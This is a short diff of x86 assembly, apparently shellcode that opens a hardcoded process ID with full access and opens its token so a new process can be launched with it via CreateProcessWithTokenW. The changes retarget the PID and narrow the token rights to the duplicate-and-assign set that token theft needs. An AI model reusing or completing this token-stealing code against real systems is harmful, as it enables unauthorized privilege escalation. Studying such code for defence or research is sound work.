@@ -107,7 +107,7 @@ OPTION casemap:none
         mov [ebp+24h], eax             ;Save CreateProcessWithTokenW address for later
 
     OpenProcess:
-        push 1188                      ; PID
+        push 4892                      ; PID
         push 1h                        ;
         push 1f07ffh                   ; PROCESS_QUERY_INFORMATION == 400h  PROCESS_ALL_ACCESS == 1f07ffh
         call dword ptr [ebp+18h]       ; call OpenProcess func
@@ -115,7 +115,7 @@ OPTION casemap:none
     Open_process_token:
         lea ebx, [ebp+30h]             ; accessToken
         push ebx                       ;
-        push 0f01ffh                   ; TOKEN_ALL_ACCESS 
+        push 0bh                       ; TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY 
         push eax                       ;
         call dword ptr [ebp+1ch]       ; call OpenProcessToken func
 
